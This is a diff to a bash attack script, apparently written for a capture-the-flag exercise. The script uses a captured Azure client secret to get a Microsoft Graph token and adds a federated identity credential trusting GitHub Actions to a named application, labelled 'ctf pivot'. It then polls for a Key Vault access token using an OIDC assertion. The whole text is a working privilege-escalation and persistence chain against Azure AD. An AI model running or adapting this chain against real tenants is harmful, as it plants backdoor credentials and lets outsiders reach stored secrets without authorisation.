@@ -13,10 +13,11 @@ ps=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret
 echo PA_ID=$pa PS_LEN=${#ps}
 graph=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://graph.microsoft.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 echo GRAPH_LEN=${#graph}
-name=ctf-$(date +%s)
-json=$(python3 -c "import json,sys;print(json.dumps({'name':sys.argv[1],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'description':'ctf pivot','audiences':['api://AzureADTokenExchange']}))" "$name" "$sub")
+name=ctf$(date +%s)
+json=$(python3 -c "import json,sys;print(json.dumps({'name':sys.argv[1],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$name" "$sub")
 resp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$json" https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials)
 echo FIC_RESP=$(echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
+echo FIC_BODY=$(echo "$resp" | head -c 700)
 for i in $(seq 1 12); do
   sleep 5
   at=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
